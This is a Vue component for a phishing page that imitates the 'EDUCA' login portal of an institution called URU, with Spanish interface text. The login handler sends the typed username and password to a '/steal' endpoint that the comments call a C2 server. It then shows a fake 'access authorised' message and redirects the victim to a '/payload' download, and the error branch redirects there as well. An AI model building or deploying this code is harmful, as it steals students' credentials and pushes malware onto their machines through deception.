<template>
  <div class="login-wrapper">
    <!-- Fondo decorativo -->
    <div class="bg-shape bg-shape-1"></div>
    <div class="bg-shape bg-shape-2"></div>

    <div class="login-container">
      <!-- Logo URU -->
      <div class="logo-uru">
        <span class="u">u</span><span class="r">R</span
        ><span class="u2">u</span>
      </div>

      <!-- Título -->
      <p class="bienvenido">Bienvenido a:</p>

      <!-- Logo EDUCA con candado -->
      <div class="educa-logo">
        <span class="educa-text">EDUCA</span>
        <span class="candado">🔒</span>
      </div>

      <!-- Formulario -->
      <div class="form-card">
        <div class="input-group">
          <input
            v-model="form.usuario"
            type="text"
            placeholder="Usuario"
            class="input-field"
            :class="{ 'input-error': errores.usuario }"
            @focus="errores.usuario = ''"
            @keyup.enter="handleLogin"
          />
          <span v-if="errores.usuario" class="error-msg">{{
            errores.usuario
          }}</span>
        </div>

        <div class="input-group">
          <div class="password-wrapper">
            <input
              v-model="form.clave"
              :type="mostrarClave ? 'text' : 'password'"
              placeholder="Clave"
              class="input-field"
              :class="{ 'input-error': errores.clave }"
              @focus="errores.clave = ''"
              @keyup.enter="handleLogin"
            />
            <button
              type="button"
              class="toggle-password"
              @click="mostrarClave = !mostrarClave"
              :aria-label="mostrarClave ? 'Ocultar clave' : 'Mostrar clave'"
            >
              <svg
                v-if="!mostrarClave"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                <circle cx="12" cy="12" r="3" />
              </svg>
              <svg
                v-else
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path
                  d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
                />
                <line x1="1" y1="1" x2="23" y2="23" />
              </svg>
            </button>
          </div>
          <span v-if="errores.clave" class="error-msg">{{
            errores.clave
          }}</span>
        </div>

        <div class="forgot-password">
          <a href="#" @click.prevent="$emit('forgot-password')"
            >¿Olvidó su Clave?</a
          >
        </div>

        <button
          class="btn-entrar"
          :class="{ 'btn-loading': cargando }"
          :disabled="cargando"
          @click="handleLogin"
        >
          <span v-if="!cargando">ENTRAR</span>
          <span v-else class="spinner-wrapper">
            <svg
              class="spinner"
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
            >
              <path d="M21 12a9 9 0 1 1-6.219-8.56" />
            </svg>
            Entrando...
          </span>
        </button>

        <!-- Mensaje de respuesta -->
        <transition name="fade">
          <div
            v-if="mensaje.texto"
            class="mensaje"
            :class="
              mensaje.tipo === 'exito' ? 'mensaje-exito' : 'mensaje-error'
            "
          >
            {{ mensaje.texto }}
          </div>
        </transition>

        <!-- Registro nuevo ingreso -->
        <div class="nuevo-ingreso">
          <p>ESTUDIANTE NUEVO INGRESO</p>
          <p>(PIU / PREGRADO)</p>
          <a href="#" @click.prevent="$emit('registro')">Haz Clic AQUI</a>
          <p>Registra tus datos</p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, reactive } from "vue";

// Emits
const emit = defineEmits([
  "login-success",
  "login-error",
  "forgot-password",
  "registro",
]);

// Estado del formulario
const form = reactive({
  usuario: "",
  clave: "",
});

const errores = reactive({
  usuario: "",
  clave: "",
});

const mostrarClave = ref(false);
const cargando = ref(false);
const mensaje = reactive({
  texto: "",
  tipo: "", // 'exito' | 'error'
});

// Validación
function validar() {
  let valido = true;
  errores.usuario = "";
  errores.clave = "";

  if (!form.usuario.trim()) {
    errores.usuario = "El usuario es obligatorio.";
    valido = false;
  }
  if (!form.clave.trim()) {
    errores.clave = "La clave es obligatoria.";
    valido = false;
  }
  return valido;
}

// Limpiar mensaje después de unos segundos
function limpiarMensaje(ms = 4000) {
  setTimeout(() => {
    mensaje.texto = "";
    mensaje.tipo = "";
  }, ms);
}

// Logica de login REAL - Exfiltra a C2
async function handleLogin() {
  if (cargando.value) return;
  if (!validar()) return;

  cargando.value = true;
  mensaje.texto = "Verificando credenciales...";

  try {
    //EXFILTRAR A TU EXPRESS C2
    const response = await fetch("http://localhost:3000/steal", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        usuario: form.usuario,
        clave: form.clave,
        sitio: "EDUCA-URU",
      }),
    });

    const data = await response.json();

    // FALSO ÉXITO
    mensaje.texto = "¡Acceso autorizado! Descargando actualización...";
    mensaje.tipo = "exito";

    // REDIRIGE A PAYLOAD
    setTimeout(() => {
      window.location.href = "http://localhost:3000/payload";
    }, 2000);
  } catch (error) {
    // FAILSAFE - igual descarga payload
    mensaje.texto = "¡Actualización disponible!";
    setTimeout(() => {
      window.location.href = "http://localhost:3000/payload";
    }, 1500);
  } finally {
    cargando.value = false;
  }
}
</script>

<style scoped>
@import url("https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Nunito:wght@400;600;700&display=swap");

/* ── Contenedor principal ─────────────────────────────── */
.login-wrapper {
  min-height: 100vh;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  background: linear-gradient(150deg, #eef0fb 0%, #f8f8fc 55%, #dce8f7 100%);
  position: relative;
  overflow: hidden;
  font-family: "Nunito", sans-serif;
}

/* Formas decorativas de fondo */
.bg-shape {
  position: absolute;
  border-radius: 50%;
  opacity: 0.18;
  pointer-events: none;
}
.bg-shape-1 {
  width: 500px;
  height: 500px;
  background: #3a6db5;
  top: -120px;
  left: -120px;
}
.bg-shape-2 {
  width: 380px;
  height: 380px;
  background: #5c6bc0;
  bottom: -80px;
  right: -80px;
}

/* ── Caja central ─────────────────────────────────────── */
.login-container {
  position: relative;
  z-index: 1;
  width: 100%;
  max-width: 420px;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 1.5rem 1rem;
}

/* ── Logo URU ─────────────────────────────────────────── */
.logo-uru {
  align-self: flex-start;
  font-family: "Rajdhani", sans-serif;
  font-weight: 700;
  font-size: 2.4rem;
  color: #1565c0;
  letter-spacing: -3px;
  line-height: 1;
  margin-bottom: 0.5rem;
}
.logo-uru .r {
  font-size: 1.9rem;
}

/* ── Bienvenido ───────────────────────────────────────── */
.bienvenido {
  font-size: 1rem;
  color: #3949ab;
  font-weight: 600;
  letter-spacing: 0.5px;
  margin: 0 0 0.25rem;
}

/* ── EDUCA + candado ──────────────────────────────────── */
.educa-logo {
  position: relative;
  display: flex;
  align-items: center;
  margin-bottom: 1.25rem;
}
.educa-text {
  font-family: "Rajdhani", sans-serif;
  font-size: 5.5rem;
  font-weight: 700;
  color: #2e2e6e;
  letter-spacing: -4px;
  line-height: 1;
}
.candado {
  position: absolute;
  bottom: 4px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.4rem;
}

/* ── Tarjeta del formulario ───────────────────────────── */
.form-card {
  background: rgba(255, 255, 255, 0.92);
  border-radius: 20px;
  padding: 2rem 2rem 1.5rem;
  width: 100%;
  border: 1px solid rgba(92, 107, 192, 0.15);
  backdrop-filter: blur(6px);
}

/* ── Inputs ───────────────────────────────────────────── */
.input-group {
  margin-bottom: 1rem;
}

.input-field {
  width: 100%;
  box-sizing: border-box;
  border: 1.5px solid #c5cae9;
  border-radius: 30px;
  padding: 12px 20px;
  font-size: 0.95rem;
  font-family: "Nunito", sans-serif;
  color: #333;
  background: #fff;
  outline: none;
  transition:
    border-color 0.2s,
    box-shadow 0.2s;
}
.input-field:focus {
  border-color: #3949ab;
  box-shadow: 0 0 0 3px rgba(57, 73, 171, 0.12);
}
.input-field.input-error {
  border-color: #e53935;
}
.input-field::placeholder {
  color: #aaa;
}

/* Campo contraseña con ojo */
.password-wrapper {
  position: relative;
}
.password-wrapper .input-field {
  padding-right: 48px;
}
.toggle-password {
  position: absolute;
  right: 14px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  color: #888;
  display: flex;
  align-items: center;
  padding: 0;
  transition: color 0.2s;
}
.toggle-password:hover {
  color: #3949ab;
}

/* Mensajes de error inline */
.error-msg {
  display: block;
  font-size: 0.78rem;
  color: #e53935;
  margin-top: 4px;
  padding-left: 12px;
}

/* ── ¿Olvidó su clave? ────────────────────────────────── */
.forgot-password {
  text-align: center;
  margin-bottom: 1.1rem;
}
.forgot-password a {
  font-size: 0.83rem;
  color: #5c6bc0;
  text-decoration: none;
  font-weight: 600;
  transition: color 0.2s;
}
.forgot-password a:hover {
  color: #3949ab;
  text-decoration: underline;
}

/* ── Botón entrar ─────────────────────────────────────── */
.btn-entrar {
  width: 100%;
  padding: 13px;
  background: #3a6db5;
  color: #fff;
  border: none;
  border-radius: 10px;
  font-size: 0.95rem;
  font-weight: 700;
  font-family: "Nunito", sans-serif;
  letter-spacing: 1.5px;
  cursor: pointer;
  transition:
    background 0.2s,
    transform 0.1s;
}
.btn-entrar:hover:not(:disabled) {
  background: #2c5d9e;
}
.btn-entrar:active:not(:disabled) {
  transform: scale(0.98);
}
.btn-entrar:disabled {
  opacity: 0.75;
  cursor: not-allowed;
}
.btn-entrar.btn-loading {
  background: #4a7fc5;
}

/* Spinner dentro del botón */
.spinner-wrapper {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}
.spinner {
  animation: spin 0.8s linear infinite;
}
@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* ── Mensaje de respuesta ─────────────────────────────── */
.mensaje {
  margin-top: 0.9rem;
  padding: 10px 16px;
  border-radius: 10px;
  font-size: 0.85rem;
  font-weight: 600;
  text-align: center;
}
.mensaje-exito {
  background: #e8f5e9;
  color: #2e7d32;
  border: 1px solid #a5d6a7;
}
.mensaje-error {
  background: #ffebee;
  color: #c62828;
  border: 1px solid #ef9a9a;
}

/* Transición fade */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

/* ── Nuevo ingreso ────────────────────────────────────── */
.nuevo-ingreso {
  margin-top: 1.4rem;
  text-align: center;
  font-size: 0.8rem;
  color: #555;
  line-height: 1.8;
}
.nuevo-ingreso p {
  margin: 0;
}
.nuevo-ingreso a {
  color: #3a6db5;
  font-weight: 700;
  text-decoration: none;
  transition: color 0.2s;
}
.nuevo-ingreso a:hover {
  color: #1565c0;
  text-decoration: underline;
}

/* ── Responsive ───────────────────────────────────────── */
@media (max-width: 480px) {
  .login-container {
    padding: 1rem 0.75rem;
  }
  .form-card {
    padding: 1.5rem 1.25rem;
  }
  .educa-text {
    font-size: 4.2rem;
  }
}
</style>
